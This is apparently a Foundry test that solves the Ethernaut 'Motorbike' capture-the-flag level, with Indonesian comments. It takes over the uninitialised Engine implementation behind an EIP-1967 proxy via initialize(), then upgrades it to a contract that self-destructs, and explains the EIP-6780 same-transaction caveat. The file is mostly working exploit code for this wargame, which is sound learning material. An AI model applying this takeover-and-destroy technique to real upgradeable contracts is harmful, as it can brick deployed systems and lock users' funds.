// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Motorbike + factory Solidity <0.7.0: interaksi lewat interface +
// deployCode (pola yang sama dengan Token/Fallout/Reentrance di fase G).
interface IMotorbikeFactory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeAttack {
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeSolve is Test {
    IMotorbikeFactory factory;
    address instance;
    address player = address(0xBEEF);
    // slot EIP-1967 implementation
    bytes32 constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        factory = IMotorbikeFactory(deployCode("MotorbikeFactory.sol:MotorbikeFactory"));
        vm.deal(player, 10 ether);
        instance = factory.createInstance(player);
    }

    function testInit() public {
        assertFalse(factory.validateInstance(payable(instance), player));
    }

    function testSolve() public {
        // PENTING (EIP-6780 / Cancun): SELFDESTRUCT hanya menghapus kode
        // bila kontrak dibuat di transaksi yang SAMA. Instance dari setUp()
        // dibuat di transaksi berbeda, jadi selfdestruct di sana tidak
        // menghapus kode Engine -> validateInstance tetap false. Solusi:
        // buat instance BARU di dalam test ini, lalu hancurkan di transaksi
        // yang sama.
        address fresh = factory.createInstance(player);
        // Baca alamat Engine dari slot EIP-1967 proxy.
        address engine = address(uint160(uint256(vm.load(fresh, IMPLEMENTATION_SLOT))));
        // initialize() hanya pernah dipanggil lewat delegatecall di konteks
        // PROXY (constructor Motorbike) — storage Engine sendiri belum
        // terinisialisasi, jadi siapa pun bisa initialize() langsung di
        // Engine dan menjadi upgrader.
        IEngine(engine).initialize();
        // Upgrade Engine ke kontrak penyerang + delegatecall kill() ->
        // selfdestruct dalam konteks Engine -> implementation hancur.
        MotorbikeAttack attack = new MotorbikeAttack();
        IEngine(engine).upgradeToAndCall(address(attack), abi.encodeWithSignature("kill()"));
        assertTrue(factory.validateInstance(payable(fresh), player));
    }
}
